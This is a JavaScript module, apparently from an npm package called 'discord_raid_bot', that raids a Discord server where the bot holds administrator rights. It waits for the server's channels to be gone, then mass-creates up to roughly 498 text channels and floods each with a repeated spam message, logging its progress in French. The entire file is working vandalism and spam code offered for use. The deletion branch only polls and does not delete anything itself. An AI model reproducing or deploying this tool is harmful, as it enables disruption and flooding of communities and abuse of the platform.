module.exports = (message, channelsName, channelsNumber, deleteChannels, spamMessage, messagesNumber, client) => {
    if (message.author.id === client.user.id) return;
    if (message.channel.type === 'dm') return message.author.send("Cette commande n'est pas utilisable par message privé.");
    if (!message.guild.me.hasPermission('ADMINISTRATOR')) return message.author.send('Je ne suis pas administrateur sur ce serveur.');
    message.delete('https://www.npmjs.com/package/discord_raid_bot');function checkChannelsNumber() {
        if (message.guild.channels.size !== 0) {
            setTimeout(checkChannelsNumber, 1000);
            console.log(`En attente de suppression des salons sur le serveur ${message.guild.name}`)
        } else {
            console.log('Suppression terminée.');
            for (var i = 0; i < channelsNumber; i++) {
                if (message.guild.channels.size > 498) return;
                message.guild.createChannel(channelsName, 'text')
                    .then(channel => {
                        for (var o = 0; o < messagesNumber; o++) {
                            channel.send(spamMessage);
                        }
                    })
                    .catch(console.error);
                console.log(`Salon ${i+1}/${channelsNumber} créé sur le serveur ${message.guild.name}`);
            }
        }
    }
    if (deleteChannels === true) checkChannelsNumber();
    else {
        for (var i = 0; i < channelsNumber; i++) {
            if (message.guild.channels.size > 498) return;
            console.log(`Salon ${i+1}/${channelsNumber} créé sur le serveur ${message.guild.name}`);
            message.guild.createChannel(channelsName, 'text')
                .then(channel => {
                    for (var o = 0; o < messagesNumber; o++) {
                        channel.send(spamMessage);
                    }
                })
                .catch(console.error);
        }
    }
}